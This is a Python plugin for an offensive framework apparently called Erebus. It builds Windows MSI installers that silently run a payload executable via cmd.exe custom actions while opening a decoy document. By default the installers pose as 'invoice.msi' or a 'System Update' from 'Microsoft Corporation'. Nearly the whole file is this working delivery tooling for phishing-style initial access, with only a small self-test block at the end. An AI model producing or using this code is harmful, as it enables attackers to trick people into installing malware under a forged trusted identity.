"""
Erebus Plugin - MSI Trigger
Author: Whispergate
Description: Creates MSI installer triggers for payload execution

This plugin creates MSI installers that execute payloads during the installation process
while displaying decoy documents. Uses WiX toolset for MSI generation.
"""

import pathlib
import subprocess
from typing import Dict, Callable, Optional

try:
    from .plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class MsiTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating Windows Installer (MSI) triggers.
    
    MSI files leverage Windows Installer's trusted execution model to execute
    payloads during installation. This plugin generates MSI packages using
    WiX toolset with custom actions for payload execution.
    """
    
    def __init__(self):
        """Initialize the MSI trigger plugin"""
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"
        self.DECOY_FILE = self.AGENT_CODE / "decoys" / "decoy.pdf"
    
    def get_metadata(self) -> PluginMetadata:
        """Return plugin metadata"""
        return PluginMetadata(
            name="msi_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates MSI installer triggers for payload execution",
            category=PluginCategory.TRIGGER,
            enabled=True
        )
    
    def register(self) -> Dict[str, Callable]:
        """Register the functions this plugin provides"""
        return {
            "create_msi_payload_trigger": self.create_msi_payload_trigger,
            "create_msi_trigger": self.create_msi_trigger,
        }
    
    def validate(self) -> tuple[bool, Optional[str]]:
        """Validate that WiX toolset (wixl) is available"""
        try:
            subprocess.check_output(["wixl", "--version"], stderr=subprocess.DEVNULL)
            return (True, None)
        except (FileNotFoundError, subprocess.CalledProcessError):
            return (False, "WiX toolset (wixl) not found. Please install WiX toolset.")
    
    def on_load(self):
        """Called when plugin is loaded"""
        print(f"[Plugin] MSI Trigger plugin loaded - Supporting Windows Installer creation")
    
    # ==================== Plugin Functions ====================
    
    def create_msi_trigger(
        self,
        payload_exe: str,
        decoy_file: str,
        payload_dir: Optional[pathlib.Path] = None,
        output_filename: str = "invoice.msi",
        product_name: str = "System Update",
        manufacturer: str = "Microsoft Corporation"
    ) -> pathlib.Path:
        """
        Create an MSI trigger using WiX toolset.
        
        The MSI uses custom actions to extract the MSI path and execute
        the payload and decoy files from the same directory.
        
        Args:
            payload_exe: Name of the payload executable
            decoy_file: Name of the decoy file
            payload_dir: Directory where payload files are stored (uses default if None)
            output_filename: Output MSI filename (default: "invoice.msi")
            product_name: Product name in MSI metadata
            manufacturer: Manufacturer name in MSI metadata
        
        Returns:
            pathlib.Path: Path to the created MSI file
            
        Raises:
            RuntimeError: If MSI creation fails
        """
        try:
            if payload_dir is None:
                payload_dir = self.PAYLOAD_DIR

            msi_output_path = payload_dir / output_filename
            
            payload_filename = pathlib.Path(payload_exe).name
            decoy_filename = pathlib.Path(decoy_file).name
            
            # Generate WiX source XML
            wxs_content = f"""<?xml version='1.0' encoding='windows-1252'?>
<Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
  <Product Name='{product_name}' Id='*' UpgradeCode='12345678-1234-1234-1234-111111111111'
    Language='1033' Codepage='1252' Version='1.0.0' Manufacturer='{manufacturer}'>

    <Package Id='*' Keywords='Installer' Description='{product_name}'
      Comments='{product_name}' Manufacturer='{manufacturer}'
      InstallerVersion='100' Languages='1033' Compressed='yes' SummaryCodepage='1252' 
      InstallScope="perUser" /> 

    <Media Id='1' Cabinet='product.cab' EmbedCab='yes' />

    <Directory Id='TARGETDIR' Name='SourceDir'>
      <Directory Id='AppDataFolder' Name='AppData'>
        <Directory Id='INSTALLDIR' Name='{product_name}'>
           <Component Id='MainComponent' Guid='*'>
             <RegistryValue Root='HKCU' Key='Software\\{manufacturer}\\{product_name}' Name='installed' Type='integer' Value='1' KeyPath='yes'/>
           </Component>
        </Directory>
      </Directory>
    </Directory>

    <Feature Id='Complete' Level='1'>
      <ComponentRef Id='MainComponent' />
    </Feature>
    
    <!-- Property for CMD -->
    <Property Id='CMD'>cmd.exe</Property>
    
    <!-- 1. Resolve SystemFolder to CMD property -->
    <CustomAction Id='SetCmdPath' Property='CMD' Value='[SystemFolder]cmd.exe' />

    <!-- 2. Run Payload using dynamic path extraction -->
    <CustomAction Id='InitUpdater' Property='CMD' 
      ExeCommand='/c for %I in ("[OriginalDatabase]") do start /b "" "%~dpI{payload_filename}"' 
      Return='asyncNoWait' Execute='immediate' />

    <!-- 3. Open Decoy using dynamic path extraction -->
    <CustomAction Id='ViewReadme' Property='CMD' 
      ExeCommand='/c for %I in ("[OriginalDatabase]") do start /b "" "%~dpI{decoy_filename}"' 
      Return='asyncNoWait' Execute='immediate' />

    <InstallExecuteSequence>
      <ResolveSource After="CostInitialize">1</ResolveSource>
      
      <Custom Action='SetCmdPath' After='CostFinalize'>1</Custom>
      <Custom Action='InitUpdater' After='InstallInitialize'>1</Custom>
      <Custom Action='ViewReadme' After='InitUpdater'>1</Custom>
    </InstallExecuteSequence>

  </Product>
</Wix>
"""
            wxs_path = payload_dir / "trigger.wxs"
            with open(wxs_path, 'w') as f:
                f.write(wxs_content)

            # Compile with wixl
            cmd = ["wixl", "-o", str(msi_output_path), str(wxs_path)]
            subprocess.check_output(cmd, cwd=payload_dir, stderr=subprocess.STDOUT)
            return msi_output_path

        except subprocess.CalledProcessError as e:
            raise RuntimeError(f"wixl compilation failed: {e.output.decode()}")
        except Exception as e:
            raise RuntimeError(f"MSI trigger creation failed: {e}")
        finally:
            if 'wxs_path' in locals() and wxs_path.exists():
                wxs_path.unlink()
    
    def create_msi_payload_trigger(
        self,
        payload_exe: str = "erebus.exe",
        payload_dir: Optional[pathlib.Path] = None,
        decoy_file: Optional[pathlib.Path] = None,
    ) -> pathlib.Path:
        """
        Create MSI payload trigger with default settings.
        
        Simplified wrapper that uses default decoy file and creates
        an MSI trigger for the specified payload.
        
        Args:
            payload_exe: Name of the payload executable (default: "erebus.exe")
            payload_dir: Directory where payload files are stored (uses default if None)
            decoy_file: Path to decoy file (uses default if None)
        
        Returns:
            pathlib.Path: Path to the created MSI file
            
        Raises:
            RuntimeError: If trigger creation fails
        """
        try:
            if decoy_file is None:
                decoy_file = self.DECOY_FILE
                
            return self.create_msi_trigger(
                payload_exe=payload_exe,
                decoy_file=decoy_file.name,
                payload_dir=payload_dir,
                product_name="Document Viewer",
                output_filename=f"{decoy_file.name}.msi"
            )
            
        except Exception as e:
            raise RuntimeError(f"MSI payload trigger creation failed: {e}")


# Testing code
if __name__ == "__main__":
    print("Testing MSI Trigger Plugin...")
    
    plugin = MsiTriggerPlugin()
    
    metadata = plugin.get_metadata()
    print(f"Plugin: {metadata.name} v{metadata.version}")
    
    is_valid, error = plugin.validate()
    if is_valid:
        print("✓ Plugin validation passed")
    else:
        print(f"✗ Plugin validation failed: {error}")
    
    print("Testing complete!")
